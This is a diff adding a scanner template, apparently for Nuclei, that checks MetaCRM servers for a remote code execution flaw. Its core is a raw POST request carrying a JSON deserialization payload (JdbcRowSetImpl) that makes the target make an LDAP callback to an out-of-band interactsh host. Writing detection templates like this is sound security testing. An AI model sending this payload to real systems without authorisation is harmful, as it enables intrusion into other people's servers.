@@ -1,0 +1,27 @@
+id: metacrm-remote-code-execution
+info:
+  name: MetaCRM Remote Code Execution Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce,dnslog
+  description: |
+    Exploitation of a remote code execution vulnerability in MetaCRM customer relationship management system.
+variables:
+  reverse: "{{interactsh-url}}"
+http:
+  - raw:
+      - |
+        POST /eai/someValue/anotherValue HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://{{reverse}}","autoCommit":true}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+      - type: dsl
+        dsl:
+          - contains(interactsh_request, "{{reverse}}")
